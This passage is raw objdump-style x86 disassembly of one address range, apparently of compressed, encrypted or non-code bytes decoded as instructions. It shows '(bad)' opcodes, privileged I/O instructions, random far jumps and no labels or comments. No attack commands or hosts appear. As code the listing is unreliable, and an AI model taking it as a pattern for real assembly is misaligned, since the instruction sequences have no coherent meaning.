  41976c:	mov    bl,al
  41976e:	ins    BYTE PTR es:[edi],dx
  41976f:	xchg   DWORD PTR [ebp-0x37],ecx
  419772:	test   eax,0x698c89c0
  419777:	sbb    ecx,DWORD PTR [ebp+0x5c8a95b1]
  41977d:	sahf   
  41977e:	add    ecx,DWORD PTR [edx+0x71a4a103]
  419784:	or     BYTE PTR [eax],al
	...
  41979e:	mov    eax,ds:0x4107798b
  4197a3:	xchg   DWORD PTR [ebx+eax*1+0x1e],edi
  4197a7:	push   0xffffffeb
  4197a9:	mov    ebx,DWORD PTR [eax]
  4197ab:	lea    ebp,[eax]
  4197ad:	retf   
  4197ae:	aam    0x88
  4197b0:	mov    bl,al
  4197b2:	je     0x41978f
  4197b4:	cli    
  4197b5:	call   edx
  4197b7:	iret   
  4197b8:	xchg   ah,ch
  4197ba:	jl     0x41978f
  4197bc:	push   ebp
  4197bd:	push   edi
  4197be:	hlt    
  4197bf:	cs adc eax,0xc5913310
  4197c5:	adc    dh,BYTE PTR [ebp+ebx*4+0x14ec737c]
  4197cc:	inc    ebp
  4197cd:	clc    
  4197ce:	outs   dx,DWORD PTR ds:[esi]
  4197cf:	pop    ecx
  4197d0:	std    
  4197d1:	mov    dl,al
  4197d3:	lahf   
  4197d4:	int3   
  4197d5:	hlt    
  4197d6:	xchg   DWORD PTR [ebp+0x34],esp
  4197d9:	mov    DWORD PTR [ebx],edi
  4197db:	mov    bl,0xc7
  4197dd:	push   eax
  4197de:	mov    fs,WORD PTR [ebx-0x79f602c9]
  4197e4:	idiv   DWORD PTR [edi]
  4197e6:	hlt    
  4197e7:	sbb    cl,al
  4197e9:	or     al,0x6d
  4197eb:	pusha  
  4197ec:	lea    eax,[ebx-0x78f9f74c]
  4197f2:	push   ecx
  4197f3:	call   0x898f:0xd8cb019c
  4197fa:	and    DWORD PTR [edx-0x4d882224],ebp
  419800:	add    dh,BYTE PTR [eax+eax*1+0x0]
	...
  419818:	add    BYTE PTR [eax],al
  41981a:	add    BYTE PTR [eax+0x1b],al
  41981d:	mov    WORD PTR [edx],es
  41981f:	and    DWORD PTR [ecx-0x2e0ec17f],ebx
  419825:	inc    ebp
  419826:	mov    DWORD PTR [ecx],esi
  419828:	push   esi
  419829:	jle    0x419873
  41982b:	cmc    
  41982c:	xchg   edx,eax
  41982d:	stos   BYTE PTR es:[edi],al
  41982e:	jbe    0x4197f5
  419830:	sbb    eax,0xf0be05cd
  419835:	fimul  DWORD PTR [edi+0x22]
  419838:	outs   dx,DWORD PTR ds:[esi]
  419839:	push   ss
  41983a:	adc    BYTE PTR [ebx-0x70],dh
  41983d:	push   ecx
  41983e:	adc    DWORD PTR [ebp+ebx*4-0x56163f7a],esi
  419845:	fdivr  QWORD PTR [edx+0x58]
  419848:	out    0x8e,al
  41984a:	jae    0x41989c
  41984c:	out    dx,eax
  41984d:	mov    ss,WORD PTR [ebx]
  41984f:	mov    eax,0xf443fd04
  419854:	fnstsw WORD PTR [ebx-0x20f69301]
  41985a:	test   BYTE PTR [eax],bh
  41985c:	clc    
  41985d:	jmp    0xeadd9070
  419862:	jl     0x41980b
  419864:	mov    BYTE PTR [edx],al
  419866:	cdq    
  419867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419868:	jp     0x4197fc
  41986a:	jl     0x419823
  41986c:	clc    
  41986d:	lea    esi,[ecx]
  41986f:	xor    eax,edx
  419871:	repz add esp,DWORD PTR [edi+0x8840b7b]
  419878:	hlt    
  419879:	mov    ecx,0xf310f139
  41987e:	jl     0x419880
	...
  419898:	daa    
  419899:	rcr    ecx,0x43
  41989c:	hlt    
  41989d:	test   DWORD PTR ds:0x5ff56790,edx
  4198a3:	inc    esi
  4198a4:	rol    BYTE PTR [esi-0x6c083eb],1
  4198aa:	outs   dx,DWORD PTR ds:[esi]
  4198ab:	dec    ecx
  4198ac:	les    edi,FWORD PTR [edx+0x24]
  4198af:	cld    
  4198b0:	outs   dx,BYTE PTR ds:[esi]
  4198b1:	rcr    esi,1
  4198b3:	jp     0x419881
  4198b5:	jl     0x4198e3
  4198b7:	cwde   
  4198b8:	in     eax,dx
  4198b9:	mov    esi,0x55582f6
  4198be:	out    0x3,eax
  4198c0:	inc    ecx
  4198c1:	xor    ah,BYTE PTR [ecx+edx*1-0x78]
  4198c5:	popf   
  4198c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198c7:	fisttp WORD PTR [edx+0x7c497086]
  4198cd:	and    BYTE PTR [edi-0x18878801],0x3
  4198d4:	hlt    
  4198d5:	jns    0x4198e3
  4198d7:	xchg   esp,eax
  4198d8:	sub    eax,0xc90afdbe
  4198dd:	xor    DWORD PTR [esi+0x19],edi
  4198e0:	add    al,0x86
  4198e2:	add    ah,bl
  4198e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198e5:	repz aas 
  4198e7:	jmp    0xd5b55e68
  4198ec:	ja     0x4198b7
  4198ee:	cmp    BYTE PTR [ebx],ah
  4198f0:	fstp   QWORD PTR [esi]
  4198f2:	mov    DWORD PTR [edi+edi*2+0x4ea6c904],esp
  4198f9:	xchg   edi,eax
  4198fa:	je     0x41990e
	...
  419914:	add    BYTE PTR [edi+0x3372fc31],bl
  41991a:	adc    dl,0xbd
  41991d:	sti    
  41991e:	jns    0x419964
  419920:	(bad)  
  419921:	lock retf 
  419923:	inc    edx
  419924:	and    edx,ebp
  419926:	stc    
  419927:	dec    esi
  419928:	ins    BYTE PTR es:[edi],dx
  419929:	cld    
  41992a:	in     eax,dx
  41992b:	mov    BYTE PTR [edi],ah
  41992d:	nop
  41992e:	sar    BYTE PTR [esi],0xe8
  419931:	neg    DWORD PTR [ebx+0x2fdd7a0c]
  419937:	dec    edi
  419938:	jmp    0x86c2:0x56e834b6
  41993f:	std    
  419940:	push   0xffffffe5
  419942:	mov    BYTE PTR [eax],al
  419944:	pop    edi
  419945:	retf   
  419946:	mov    BYTE PTR [ebx-0x23],dh
  419949:	mov    cl,0x0
  41994b:	sbb    eax,0x14118309
  419950:	es jne 0x419953
  419953:	sbb    eax,0x3e818019
  419958:	call   0xb5bc9d54
  41995d:	push   cs
  41995e:	inc    edx
  41995f:	or     BYTE PTR [edx],al
  419961:	pusha  
  419962:	add    esi,ebp
  419964:	shl    ah,cl
  419966:	mov    WORD PTR [ecx],es
  419968:	call   0x8587:0xea0c11f8
  41996f:	jl     0x419906
  419971:	out    dx,al
  419972:	sub    esp,esi
  419974:	add    BYTE PTR [esi],dh
  419976:	push   edi
  419977:	or     eax,DWORD PTR [edx+0x0]
	...
  419991:	add    dl,bh
  419993:	jne    0x419990
  419995:	(bad)  
  419996:	jmp    0xc4d9:0xfb0c4109
  41999d:	ret    0x13d
  4199a0:	push   ecx
  4199a1:	mov    ebp,DWORD PTR [ecx-0x69a9b130]
  4199a7:	lods   al,BYTE PTR ds:[esi]
  4199a8:	rcl    DWORD PTR [edx],0x5d
  4199ab:	add    DWORD PTR [ebx-0x1],edx
  4199ae:	pusha  
  4199af:	test   esp,edi
  4199b1:	(bad)  
  4199b2:	(bad)  
  4199b4:	pop    es
  4199b5:	mov    eax,ebp
  4199b7:	jbe    0x41998f
  4199b9:	test   edx,ebx
  4199bb:	mul    DWORD PTR [edx-0x7b]
  4199be:	int    0xf7
  4199c0:	pop    esi
  4199c1:	push   0x1a
  4199c3:	jbe    0x419a36
  4199c5:	or     BYTE PTR [edx],cl
  4199c7:	jge    0x419a32
  4199c9:	adc    ebx,DWORD PTR [ebp+0x61c08108]
  4199cf:	cmp    al,0x40
  4199d1:	push   eax
  4199d2:	fs int 0x7
  4199d5:	push   ebx
  4199d7:	add    BYTE PTR [ecx-0x4],al
  4199da:	sub    ah,cl
  4199dc:	aaa    
  4199dd:	add    dl,BYTE PTR [eax+0x49]
  4199e0:	je     0x419a24
  4199e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199e3:	out    0x38,al
  4199e5:	add    DWORD PTR [ebp+0x6685d7fd],ebx
  4199eb:	sbb    eax,0x1cba5733
  4199f0:	or     al,0x53
  4199f2:	lds    eax,FWORD PTR [edi]
  4199f4:	add    DWORD PTR ds:[eax],eax
	...
  419a0f:	popf   
  419a10:	push   ds
  419a11:	cmp    edi,edi
  419a13:	rol    BYTE PTR [ebx+edi*8],0x15
  419a17:	jmp    0x5a41d791
  419a1c:	sbb    al,0x8
  419a1e:	test   esp,esi
  419a20:	lods   eax,DWORD PTR ds:[esi]
  419a21:	sti    
  419a22:	xchg   edx,eax
  419a23:	xor    al,0x94
  419a25:	mov    esp,0xfff8fd24
  419a2a:	cmp    al,dh
  419a2c:	dec    ebx
  419a2d:	jns    0x419a2e
  419a2f:	jle    0x419a62
  419a31:	nop
  419a32:	mov    eax,ebp
  419a34:	ins    BYTE PTR es:[edi],dx
  419a35:	cdq    
  419a36:	aaa    
  419a37:	sbb    DWORD PTR [ebp+0x1],ebp
  419a3a:	mov    DWORD PTR [edi],esi
  419a3c:	xlat   BYTE PTR ds:[ebx]
  419a3d:	stc    
  419a3e:	cld    
  419a3f:	test   eax,0x1cc57869
  419a44:	in     eax,0xe4
  419a46:	(bad)  
  419a47:	and    ebp,DWORD PTR [ebx+0x302d592b]
  419a4d:	cld    
  419a4e:	jmp    FWORD PTR [eax+0x187f9fe6]
  419a54:	pop    esi
  419a55:	add    al,BYTE PTR [eax]
  419a57:	hlt    
  419a58:	mov    esi,0x6b8e5533
  419a5d:	js     0x419a4f
  419a5f:	dec    esp
  419a60:	xor    al,0x45
  419a62:	stc    
  419a63:	hlt    
  419a64:	push   esp
  419a65:	inc    esi
  419a66:	or     bl,dh
  419a68:	repz js 0x419a6b
  419a6b:	hlt    
  419a6c:	ins    DWORD PTR es:[edi],dx
  419a6d:	xor    DWORD PTR [eax+0x6c],ebp
  419a70:	add    eax,DWORD PTR [ecx+0x0]
	...
  419a8b:	add    BYTE PTR [edi+0x23],bh
  419a8e:	pushf  
  419a8f:	sbb    ecx,DWORD PTR [edi]
  419a91:	ins    DWORD PTR es:[edi],dx
  419a92:	add    DWORD PTR [ebx-0x74f4274c],eax
  419a98:	cmp    dh,BYTE PTR [edi+esi*2+0x8]
  419a9c:	je     0x419af2
  419a9e:	loope  0x419b13
  419aa0:	out    dx,al
  419aa1:	in     eax,dx
  419aa2:	mov    DWORD PTR [edi],eax
  419aa4:	sbb    BYTE PTR [esi-0x7f],dh
  419aa7:	test   DWORD PTR [ecx],0x9f3fff3b
  419aad:	rcr    eax,0xef
  419ab0:	test   DWORD PTR [esp+ebx*1],0xeee16efc
  419ab7:	xor    eax,0x935c91c4
  419abc:	push   0xffffff83
  419abe:	mov    es,esp
  419ac0:	ja     0x419b36
  419ac2:	test   DWORD PTR [ecx+ebx*2-0xbfc18f9],ecx
  419ac9:	ins    BYTE PTR es:[edi],dx
  419aca:	or     bh,BYTE PTR [esi-0x549d7cb7]
  419ad0:	ja     0x419b31
  419ad2:	fcmovne st,st(7)
  419ad4:	int    0x3e
  419ad6:	mov    edx,0xf9f1078c
  419adb:	inc    ebx
  419adc:	hlt    
  419add:	(bad)  
  419ade:	dec    edi
  419adf:	xchg   BYTE PTR [ecx],ah
  419ae1:	clc    
  419ae2:	or     eax,0x3c6d5a31
  419ae7:	add    esi,esp
  419ae9:	das    
  419aea:	sub    dh,BYTE PTR ds:0x30a181c
	...
  419b08:	add    ah,dh
  419b0a:	(bad)  
  419b0b:	mov    ah,0xff
  419b0d:	mov    al,0xdb
  419b0f:	outs   dx,DWORD PTR ds:[esi]
  419b10:	add    cl,BYTE PTR [edx-0x7a]
  419b13:	pop    ds
  419b14:	mov    esp,ds
  419b16:	or     edx,ecx
  419b18:	add    dh,ah
  419b1a:	lea    esi,[ebx+esi*8+0x46250472]
  419b21:	int    0x4
  419b23:	call   0x6e03:0xe841ab9b
  419b2a:	enter  0x2be1,0x1a
  419b2e:	fisubr WORD PTR [edi+0x620500c6]
  419b34:	inc    ebp
  419b35:	inc    eax
  419b36:	push   es
  419b37:	and    esp,eax
  419b39:	sti    
  419b3a:	aas    
  419b3b:	out    0x3,eax
  419b3d:	push   esp
  419b3e:	add    eax,0x8228e936
  419b43:	add    BYTE PTR ds:0x308b0e94,bh
  419b49:	enter  0x747f,0xcd
  419b4d:	add    DWORD PTR [ecx+0x798fe575],0xffffffdf
  419b54:	xchg   esi,eax
  419b55:	jg     0x419b37
  419b57:	sub    BYTE PTR [ecx-0x174ff6fc],0x7a
  419b5e:	pop    es
  419b5f:	xor    ch,BYTE PTR [ecx+0x3000d3a]
  419b65:	icebp  
  419b66:	cmp    DWORD PTR [edi+0x61525fd9],0xffffffe9
	...
  419b85:	add    bh,dh
  419b87:	mov    ah,0xff
  419b89:	sub    esi,esp
  419b8b:	mov    ebp,edi
  419b8d:	push   esi
  419b8e:	push   es
  419b8f:	aad    0xe7
  419b91:	pop    esi
  419b92:	sub    al,0x83
  419b94:	std    
  419b95:	aas    
  419b96:	mov    ah,0x28
  419b98:	or     al,ch
  419b9a:	ss or  esp,eax
  419b9d:	arpl   WORD PTR [eax-0x3a188bfc],si
  419ba3:	ins    BYTE PTR es:[edi],dx
  419ba4:	jl     0x419b8b
  419ba6:	lock add al,0x89
  419ba9:	daa    
  419baa:	push   ds
  419bab:	inc    edi
  419bac:	add    al,0xe9
  419bae:	and    al,0x8c
  419bb0:	in     al,dx
  419bb1:	push   0xffffff94
  419bb3:	jl     0x419c34
  419bb5:	adc    eax,0xe9000cdc
  419bba:	or     bl,bl
  419bbc:	xor    BYTE PTR [ecx],ch
  419bbe:	pop    es
  419bbf:	lds    ecx,FWORD PTR [edx-0x76ce5c93]
  419bc5:	rcr    BYTE PTR [edi-0x5e],0xf8
  419bc9:	jmp    0xaf01cfc5
  419bce:	jmp    0x419bf8
  419bd0:	xor    BYTE PTR [ecx-0x3afb],al
  419bd6:	and    al,0x2
  419bd8:	and    al,0x80
  419bda:	popf   
  419bdb:	add    eax,0x62198900
  419be0:	add    DWORD PTR [eax],0x8485058d
  419be6:	test   eax,0xfffffd
	...
  419c03:	pop    ebp
  419c04:	inc    esi
  419c05:	test   BYTE PTR [ecx+edx*8],ah
  419c08:	add    eax,0x84d0000
  419c0d:	add    BYTE PTR [eax],al
  419c0f:	out    0x42,al
  419c11:	adc    BYTE PTR [ebx+0x876fc5c],cl
  419c17:	jmp    0x8737:0x312453fb
  419c1e:	push   ebx
  419c1f:	dec    ecx
  419c20:	(bad)  
  419c21:	push   ecx
  419c22:	(bad)  
  419c23:	pop    ecx
  419c24:	popa   
  419c25:	sbb    BYTE PTR [eax],al
  419c27:	ret    0x435
  419c2a:	test   ch,cl
  419c2c:	jle    0x419baf
  419c2e:	jge    0x419c3f
  419c30:	add    eax,0x61598d00
  419c35:	sbb    DWORD PTR [eax+0x37],edx
  419c38:	add    eax,0x11d2016a
  419c3d:	and    al,0x24
  419c3f:	in     eax,0x21
  419c41:	push   0x0
  419c43:	fld    QWORD PTR [ecx]
  419c45:	inc    esp
  419c46:	and    al,0xed
  419c48:	inc    DWORD PTR [ebx+0x24]
  419c4b:	in     eax,0xff
  419c4d:	pop    es
  419c4e:	mov    esp,DWORD PTR [eax+ebp*2-0x741eb47a]
  419c55:	xor    BYTE PTR [ebx+0x3bdd9bcd],cl
  419c5b:	int3   
  419c5c:	add    al,0x56
  419c5e:	call   0x3fef19
  419c63:	push   ds
  419c64:	or     eax,0x1024
	...
  419c7d:	add    BYTE PTR [eax],al
  419c7f:	add    ah,dh
  419c81:	ins    DWORD PTR es:[edi],dx
  419c82:	clc    
  419c83:	xor    DWORD PTR ds:0x7400016c,0x7
  419c8a:	add    al,0x8b
  419c8c:	adc    BYTE PTR [edx],cl
  419c8e:	loopne 0x419c47
  419c90:	push   ecx
  419c91:	outs   dx,BYTE PTR ds:[esi]
  419c92:	add    DWORD PTR [eax],eax
  419c94:	or     DWORD PTR [ebp+0x41],ebp
  419c97:	call   0x464a3c
  419c9c:	and    edx,0x6df4bfdf
  419ca2:	add    DWORD PTR [eax+0x16e98],edi
  419ca8:	dec    esp
  419ca9:	stos   DWORD PTR es:[edi],eax
  419caa:	rol    DWORD PTR [eax],0xf4
  419cad:	lock dec edi
  419caf:	and    al,0x1e
  419cb1:	ins    DWORD PTR es:[edi],dx
  419cb2:	add    DWORD PTR [eax],eax
  419cb4:	dec    esp
  419cb5:	(bad)  
  419cb6:	call   0x817c:0x13e73bfd
  419cbd:	stos   BYTE PTR es:[edi],al
  419cbe:	frstor [edi]
  419cc0:	sub    esp,DWORD PTR [edx-0x23]
  419cc3:	adc    eax,esp
  419cc5:	loop   0x419c85
  419cc7:	push   eax
  419cc8:	imul   esi,DWORD PTR [edx-0xf5bd023],0x9ddc243f
  419cd2:	cdq    
  419cd3:	push   ss
  419cd4:	cli    
  419cd5:	ins    BYTE PTR es:[edi],dx
  419cd6:	add    DWORD PTR [ecx-0x3f82f9d0],eax
  419cdc:	add    edi,ecx
  419cde:	lds    esi,FWORD PTR [edi+0x16cda]
	...
  419cfc:	add    BYTE PTR [edi+0x27],ch
  419cff:	ret    0xf400
  419d02:	lods   eax,DWORD PTR ds:[esi]
  419d03:	cmp    dh,BYTE PTR [ebx-0x33]
  419d06:	repnz or al,0x8
  419d09:	jo     0x419d26
  419d0b:	or     eax,0xf0f8c344
  419d10:	mov    BYTE PTR [eax],dh
  419d12:	add    eax,0xc8dce00b
  419d17:	add    ch,ah
  419d19:	test   al,0xf9
  419d1b:	loop   0x419d99
  419d1d:	dec    eax
  419d1e:	sub    ebx,ebp
  419d20:	jl     0x419ccc
  419d22:	ins    BYTE PTR es:[edi],dx
  419d23:	lods   al,BYTE PTR ds:[esi]
  419d24:	fwait
  419d25:	hlt    
  419d26:	add    al,0x63
  419d28:	ret    
  419d29:	add    BYTE PTR [edi],bl
  419d2b:	mov    dh,0xe
  419d2d:	in     al,0x8b
  419d2f:	and    esp,eax
  419d31:	out    0x7f,eax
  419d33:	sbb    al,0xf8
  419d35:	jl     0x419d0f
  419d37:	ret    0x7cdf
  419d3a:	dec    esi
  419d3b:	jg     0x419d94
  419d3d:	dec    esp
  419d3e:	add    al,0xe7
  419d40:	jg     0x419d76
  419d42:	clc    
  419d43:	jmp    0x419d06
  419d45:	mov    eax,0x4902ee28
  419d4a:	clc    
  419d4b:	retf   0x5bef
  419d4e:	and    al,0xb2
  419d50:	add    dh,ah
  419d52:	jg     0x419d2f
  419d54:	fisttp WORD PTR [edi]
  419d56:	ins    DWORD PTR es:[edi],dx
  419d57:	test   ah,0x2a
  419d5a:	jg     0x419dc3
  419d5c:	pop    es
  419d5d:	fmul   DWORD PTR [edi]
  419d5f:	out    0xf8,eax
	...
  419d79:	add    BYTE PTR [edi+0x1],dh
  419d7c:	call   0x86af9184
  419d81:	add    esi,esp
  419d83:	add    al,0x3d
  419d85:	jg     0x419d5f
  419d87:	cwde   
  419d88:	out    0x3,eax
  419d8a:	hlt    
  419d8b:	add    eax,0xc174f99b
  419d90:	ret    
  419d91:	imul   esi,esp,0x4
  419d94:	out    0x3,eax
  419d96:	icebp  
  419d97:	xchg   DWORD PTR [edi-0x2fb0bfe],eax
  419d9d:	jle    0x419db7
  419d9f:	cdq    
  419da0:	out    0x3,eax
  419da2:	hlt    
  419da3:	and    al,0x0
  419da5:	jge    0x419d64
  419da7:	test   DWORD PTR [ebp+eax*8-0x16fffadd],edi
  419dae:	test   DWORD PTR [edi],0x4f13183
  419db4:	add    BYTE PTR [esi-0x16fff308],dl
  419dba:	jle    0x419d84
  419dbc:	cld    
  419dbd:	cmp    eax,0x658b0e94
  419dc2:	xchg   esp,eax
  419dc3:	sbb    al,BYTE PTR [ecx]
  419dc5:	jmp    0x25cc72c1
  419dca:	xchg   esp,eax
  419dcb:	out    0x4f,al
  419dcd:	je     0x419d83
  419dcf:	sub    BYTE PTR [ecx+edx*4-0x4f],cl
  419dd3:	into   
  419dd4:	(bad)  
  419dd5:	call   0xf9656008
  419dda:	bound  eax,QWORD PTR [ebx+0xe81b]
	...
  419df4:	add    BYTE PTR [eax],al
  419df6:	add    bh,dh
  419df8:	add    al,0x8a
  419dfa:	and    eax,0xf623d954
  419dff:	repz or al,0x3c
  419e02:	rol    BYTE PTR [edx-0x7d],cl
  419e05:	or     ebp,eax
  419e07:	test   DWORD PTR [esp+edi*1],0xd8822302
  419e0e:	jmp    0xcdc2a30a
  419e13:	cmp    ecx,DWORD PTR [esi]
  419e15:	add    dh,dh
  419e17:	xchg   ebx,eax
  419e18:	jp     0x419e1a
  419e1a:	jmp    0x9e482a16
  419e1f:	jl     0x419db1
  419e21:	and    al,0xcd
  419e23:	test   BYTE PTR [eax+eax*1],0xb8
  419e27:	outs   dx,BYTE PTR ds:[esi]
  419e28:	dec    edi
  419e29:	std    
  419e2a:	mov    ecx,0xcd4486eb
  419e2f:	out    0x82,eax
  419e31:	rcl    BYTE PTR [eax+0x138050],0x9
  419e38:	je     0x419e77
  419e3a:	add    BYTE PTR [eax-0x32ffdbae],cl
  419e40:	jbe    0x419dc4
  419e42:	ror    ebp,1
  419e44:	add    DWORD PTR [eax],eax
  419e46:	call   DWORD PTR [eax+0x7d]
  419e49:	mov    al,BYTE PTR [ecx+esi*8-0x72000010]
  419e50:	xor    DWORD PTR [edi+0x1d1b9d45],eax
  419e56:	call   0x423f80
	...
  419e73:	add    BYTE PTR [eax],dl
  419e75:	inc    edx
  419e76:	or     eax,DWORD PTR [ecx+ecx*4+0x7efffb86]
  419e7d:	inc    ecx
  419e7e:	inc    eax
  419e7f:	test   DWORD PTR [ebp+0x5da98276],ebx
  419e85:	add    DWORD PTR [eax],eax
  419e87:	mov    ecx,ecx
  419e89:	pop    ebp
  419e8a:	jge    0x419e8c
  419e8c:	dec    ebp
  419e8d:	add    DWORD PTR [edi-0x2be7c],eax
  419e93:	call   FWORD PTR [ebp+0x52]
  419e96:	(bad)  
  419e97:	push   0x4c
  419e99:	add    BYTE PTR [esp+0x1d1],cl
  419ea0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ea1:	cmc    
  419ea2:	and    ecx,DWORD PTR [eax-0x76fffee3]
  419ea8:	cdq    
  419ea9:	pop    ebp
  419eaa:	mov    DWORD PTR [eax],eax
  419eac:	or     eax,0xca8b4d01
  419eb1:	cdq    
  419eb2:	stos   BYTE PTR es:[edi],al
  419eb3:	push   0x1d
  419eb5:	add    DWORD PTR [edi+0x748f90f0],eax
  419ebb:	outs   dx,BYTE PTR ds:[esi]
  419ebc:	xchg   esi,eax
  419ebd:	jg     0x419e47
  419ebf:	dec    ebx
  419ec0:	jmp    0x805de414
  419ec5:	push   ds
  419ec6:	xchg   DWORD PTR [ebx-0xc],ecx
  419ec9:	jge    0x419f45
  419ecb:	inc    DWORD PTR [ecx+0xb]
  419ece:	xor    DWORD PTR [eax],ecx
  419ed0:	sar    DWORD PTR [ecx+edi*2-0x66a0efbc],cl
  419ed7:	jecxz  0x419ed9
	...
  419ef1:	std    
  419ef2:	ins    BYTE PTR es:[edi],dx
  419ef3:	add    DWORD PTR [esi-0x34],edx
  419ef6:	or     ecx,esp
  419ef8:	(bad)  
  419ef9:	mov    bl,0xee
  419efb:	pop    es
  419efc:	and    al,0xfb
  419efe:	ins    DWORD PTR es:[edi],dx
  419eff:	or     eax,0x2fa347
  419f04:	sbb    BYTE PTR [edi],0x66
  419f07:	add    DWORD PTR [ebx+0x34],esi
  419f0a:	icebp  
  419f0b:	aas    
  419f0c:	and    al,0x34
  419f0e:	push   esi
  419f0f:	ja     0x419f71
  419f11:	hlt    
  419f12:	ins    DWORD PTR es:[edi],dx
  419f13:	jle    0x419ed5
  419f15:	jmp    0x419ef1
  419f17:	jb     0x419f14
  419f19:	jae    0x419ebe
  419f1b:	xchg   edi,eax
  419f1c:	sub    ebx,esi
  419f1e:	ins    DWORD PTR es:[edi],dx
  419f1f:	jbe    0x419f6d
  419f21:	sbb    BYTE PTR [edx],ch
  419f23:	pushf  
  419f24:	jecxz  0x419efa
  419f26:	ins    DWORD PTR es:[edi],dx
  419f27:	add    DWORD PTR [esi+0x7f],esp
  419f2a:	xor    ah,al
  419f2c:	push   ebx
  419f2d:	mov    WORD PTR [esi+0xbf40004],?
  419f33:	xlat   BYTE PTR ds:[ebx]
  419f34:	(bad)  
  419f35:	jmp    0x419f69
  419f37:	shl    ebp,0x4c
  419f3a:	pop    es
  419f3b:	les    eax,FWORD PTR [ecx+0x539a7014]
  419f41:	and    edx,ebx
  419f43:	adc    BYTE PTR [ebp+0xc],0xdb
  419f47:	enter  0x13fe,0xef
  419f4b:	push   es
  419f4c:	add    al,0xf4
  419f4e:	cmp    dl,BYTE PTR [eax+0x24]
  419f51:	je     0x419fc1
  419f53:	add    DWORD PTR [eax],eax
	...
  419f6d:	add    bl,ch
  419f6f:	sar    BYTE PTR [esi-0x1ffa8f18],cl
  419f75:	add    dh,ah
  419f77:	fstp   TBYTE PTR [ecx+edi*2-0x609e204b]
  419f7e:	aas    
  419f7f:	inc    edi
  419f80:	fild   DWORD PTR [ebx]
  419f82:	retf   0xcac0
  419f85:	dec    edx
  419f87:	shl    DWORD PTR [ecx-0x6d],1
  419f8a:	mov    ecx,0x340db702
  419f8f:	add    eax,0x6d49fd73
  419f94:	inc    edx
  419f95:	retf   
  419f96:	stos   BYTE PTR es:[edi],al
  419f97:	jnp    0x41a00b
  419f99:	mov    ebp,0x3eb4742
  419f9e:	cdq    
  419f9f:	lock add bh,al
  419fa2:	je     0x419f86
  419fa4:	jmp    0xb9f8:0x2f08903
  419fab:	ret    0x2de
  419fae:	and    bh,BYTE PTR [ebx+esi*1-0x20]
  419fb2:	add    ebp,DWORD PTR [ebp-0x38]
  419fb5:	mov    al,ds:0xc3637b69
  419fba:	call   0x1e0579cc
  419fbf:	ret    
  419fc0:	loop   0x419faa
  419fc2:	xchg   ebx,eax
  419fc3:	jae    0x419f64
  419fc5:	sar    eax,0x4
  419fc8:	adc    al,0x79
  419fca:	push   eax
  419fcb:	aad    0x19
  419fcd:	mov    eax,cs:0xffbaec
	...
  419feb:	xor    edi,DWORD PTR [ebx-0x2f]
  419fee:	sti    
  419fef:	sub    BYTE PTR [ecx],dh
  419ff1:	aas    
  419ff2:	lods   eax,DWORD PTR ds:[esi]
  419ff3:	mov    ch,0x4
  419ff5:	sbb    ch,BYTE PTR [ecx-0x7bb5268d]
  419ffb:	out    0x20,eax
  419ffd:	fadd   DWORD PTR [ebx-0xc]
  41a000:	(bad)  
  41a001:	aaa    
  41a002:	enter  0xb04,0x0
  41a006:	ins    DWORD PTR es:[edi],dx
  41a007:	cmp    al,BYTE PTR [eax+eax*1]
  41a00a:	jmp    0xf9fdde7b
  41a00f:	aaa    
  41a010:	add    eax,0xef24b751
  41a015:	(bad)  
  41a016:	mov    ecx,0x261bf670
  41a01b:	shl    DWORD PTR [edx],1
  41a01d:	add    cl,ch
  41a01f:	div    DWORD PTR [edi+0x73]
  41a022:	icebp  
  41a023:	js     0x41a075
  41a025:	sub    DWORD PTR [ecx],0xffffffc0
  41a028:	xchg   BYTE PTR [ebx+0x5104f7e9],bl
  41a02e:	aas    
  41a02f:	ret    
  41a030:	in     al,dx
  41a031:	(bad)  
  41a032:	cmp    DWORD PTR [edi-0xa],esi
  41a035:	sbb    edx,esi
  41a037:	popf   
  41a038:	add    bh,ch
  41a03a:	mov    dh,0x7d
  41a03c:	inc    ebp
  41a03d:	or     eax,0x57f6d
  41a042:	jmp    0xb65d96bd
  41a047:	fstp   QWORD PTR [eax+0x10]
  41a04a:	sub    eax,edi
  41a04c:	ja     0x41a0c4
  41a04e:	icebp  
	...
  41a067:	add    BYTE PTR [edx+0x3e],bh
  41a06a:	ins    BYTE PTR es:[edi],dx
  41a06b:	div    DWORD PTR [edi]
  41a06d:	jp     0x419ff7
  41a06f:	xor    al,0x14
  41a071:	js     0x41a048
  41a073:	xor    BYTE PTR [ebx+0x3e3e0d4d],al
  41a079:	or     ch,dh
  41a07b:	mov    al,ds:0xe14e8330
  41a080:	inc    ebx
  41a081:	or     BYTE PTR [ecx+0x6f0fb81],al
  41a087:	push   0xffffff98
  41a089:	adc    BYTE PTR [ebx-0x8],dh
  41a08c:	adc    DWORD PTR [edx],ebx
  41a08e:	jmp    0x201d0974
  41a093:	ret    
  41a094:	inc    DWORD PTR [ecx+0x58f9005e]
  41a09a:	arpl   WORD PTR [ecx-0x48f4eba5],cx
  41a0a0:	dec    ebx
  41a0a1:	adc    al,0xb
  41a0a3:	scas   eax,DWORD PTR es:[edi]
  41a0a4:	fwait
  41a0a5:	add    DWORD PTR [ebx],ecx
  41a0a7:	scas   eax,DWORD PTR es:[edi]
  41a0a8:	sbb    al,0x98
  41a0aa:	jg     0x41a08e
  41a0ac:	fiadd  DWORD PTR [edx]
  41a0ae:	ret    0x5c1
  41a0b1:	add    dl,BYTE PTR [eax-0x1]
  41a0b4:	or     cl,BYTE PTR [edx-0x776bf387]
  41a0ba:	inc    esi
  41a0bb:	adc    al,0x44
  41a0bd:	addr16 or eax,0xff71c63b
  41a0c3:	mov    BYTE PTR [edx-0x7a],ch
  41a0c6:	jno    0x41a0e0
  41a0c8:	xchg   edx,eax
  41a0c9:	jl     0x41a0dc
  41a0cb:	inc    DWORD PTR [eax]
	...
  41a0e5:	dec    eax
  41a0e6:	adc    DWORD PTR [edi+0x56],ecx
  41a0e9:	ret    0x57c
  41a0ec:	dec    DWORD PTR [eax-0x62bfef43]
  41a0f2:	mov    BYTE PTR [ecx-0x4],al
  41a0f5:	test   cl,0x73
  41a0f8:	add    al,0x86
  41a0fa:	cli    
  41a0fb:	jo     0x41a111
  41a0fd:	or     ebp,ecx
  41a0ff:	cmp    BYTE PTR [eax],bh
  41a101:	pop    esp
